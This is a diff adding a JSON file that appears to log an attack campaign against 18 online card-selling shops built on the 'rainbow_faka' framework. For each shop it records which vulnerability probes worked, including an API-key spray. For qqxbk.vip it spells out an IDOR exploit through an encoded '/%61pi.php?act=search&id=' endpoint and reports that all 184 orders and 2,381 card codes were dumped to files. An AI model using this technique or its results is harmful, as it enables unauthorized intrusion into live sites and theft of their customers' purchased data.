@@ -1,0 +1,94 @@
+{
+  "batch": "18 shops @ 2026-08-04",
+  "targets": [
+    "https://qcccc888.top/shop/",
+    "https://tianfei88.lol/shop/",
+    "https://hu6621.cn/shop/",
+    "https://xiaobei.lol/shop/",
+    "https://youhui1998.top/shop/",
+    "http://xdd6689.top/shop/",
+    "https://dadiqq.com/shop/",
+    "https://lbd.lol/shop/",
+    "https://xxn7788.top/shop/",
+    "https://qqbizu666.top/shop/",
+    "https://qq857.cc/shop/",
+    "https://tangsqq.top/shop/",
+    "http://zhanghaofk88.top/shop/",
+    "https://byqqdd.top/shop/",
+    "https://kdyfk.top/shop/",
+    "https://qqxbk.vip/",
+    "https://chuhao.lol/shop/",
+    "https://jackww.top/shop/"
+  ],
+  "cluster": {
+    "framework": "rainbow_faka",
+    "yxts_majority": 277,
+    "exceptions": {
+      "xdd6689.top": {"yxts": 1008, "orders": 786},
+      "qqxbk.vip": {"yxts": 194, "orders": 184, "path": "root"}
+    }
+  },
+  "sites": [
+    {"url": "https://qcccc888.top/shop/", "title": "大帅qq发卡网", "yxts": 277, "orders": 41, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://tianfei88.lol/shop/", "title": "天妃{一手货源}", "yxts": 277, "orders": 32723, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://hu6621.cn/shop/", "title": null, "yxts": 277, "orders": 380, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://xiaobei.lol/shop/", "title": "自动发卡", "yxts": 277, "orders": 3801, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://youhui1998.top/shop/", "title": "自动发卡", "yxts": 277, "orders": 56234, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "http://xdd6689.top/shop/", "title": "小叮当qq自动发卡客服飞机 @xdd66989", "yxts": 1008, "orders": 786, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://dadiqq.com/shop/", "title": "大地QQ KOKO独家专属密码", "yxts": 277, "orders": 173000, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://lbd.lol/shop/", "title": "自动发卡", "yxts": 277, "orders": 4256, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://xxn7788.top/shop/", "title": "小仙女7788", "yxts": 277, "orders": 2391, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://qqbizu666.top/shop/", "title": "自动发卡", "yxts": 277, "orders": 10360, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://qq857.cc/shop/", "title": "自动发卡", "yxts": 277, "orders": 392, "ajax_query": "live_empty_data", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://tangsqq.top/shop/", "title": "自动发卡", "yxts": 277, "orders": 277, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "http://zhanghaofk88.top/shop/", "title": "布布发卡", "yxts": 277, "orders": 9, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://byqqdd.top/shop/", "title": "唯一", "yxts": 277, "orders": 1776, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://kdyfk.top/shop/", "title": "客服@paws8889", "yxts": 277, "orders": 312, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {
+      "url": "https://qqxbk.vip/",
+      "title": "XBK星巴克自动发货",
+      "yxts": 194,
+      "orders": 184,
+      "ajax_query": "live_empty_data",
+      "api_search": "open_idor_live",
+      "tools_oracle": true,
+      "note": "%61pi.php?act=search&id=1..184 returns code=0 with 订单结果 kami; id>=185 → 订单不存在"
+    },
+    {"url": "https://chuhao.lol/shop/", "title": "彦祖QQ", "yxts": 277, "orders": 97813, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true},
+    {"url": "https://jackww.top/shop/", "title": "星云qq号商", "yxts": 277, "orders": 21, "ajax_query": "HTTP_500", "api_search": "auth_required", "tools_oracle": true}
+  ],
+  "success_cases_migration": {
+    "source": "/data/recon/exports/SUCCESS_CASES.md",
+    "tested_upfront": true,
+    "per_case": {
+      "qd93_substring_query": "not_vulnerable_sampled",
+      "rainbow_ajax_query_dump": "http_500_on_16; qq857_and_qqxbk_live_but_data_empty",
+      "79yj_api_search_idor": "auth_required_on_17; qqxbk_vip_OPEN_FULL_DUMP",
+      "tools_apikey": "oracle_live_short_spray_no_hit",
+      "mima1314_ykfaka_null": "N/A_all_rainbow"
+    },
+    "directly_reusable": [
+      {
+        "case": "79yj_api_search_idor",
+        "site": "https://qqxbk.vip/",
+        "endpoint": "/%61pi.php?act=search&id=",
+        "result": "184/184 orders dumped; 2381 kami lines / 2370 unique"
+      }
+    ]
+  },
+  "kami_obtained": true,
+  "kami_stats": {
+    "site": "qqxbk.vip",
+    "orders_dumped": 184,
+    "kami_lines": 2381,
+    "unique_kami": 2370,
+    "artifacts": [
+      "results/dump/qqxbk_cards.json",
+      "results/dump/qqxbk_kami.tsv",
+      "results/dump/qqxbk_kami_unique.txt",
+      "results/dump/qqxbk_stats.json"
+    ]
+  },
+  "hk_artifacts": "/data/recon/batch18/",
+  "ts": "2026-08-04T13:19:00Z"
+}
